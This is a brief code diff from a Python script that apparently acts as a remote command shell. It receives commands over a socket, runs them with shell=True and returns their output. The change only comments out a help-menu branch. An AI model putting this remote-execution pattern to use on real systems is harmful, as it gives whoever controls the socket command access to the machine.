@@ -142,8 +142,8 @@ class functions(object):
                 else:
                     soc.send(stdout)
 
-            elif data == "help\n":
-                soc.send("admins for administrators\nusers for users\nwhelp for windows help.\n")
+            #elif data == "help\n":
+             #   soc.send("admins for administrators\nusers for users\nwhelp for windows help.\n")
 
             elif data == "whelp\n":
                 proc = subprocess.Popen("help", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
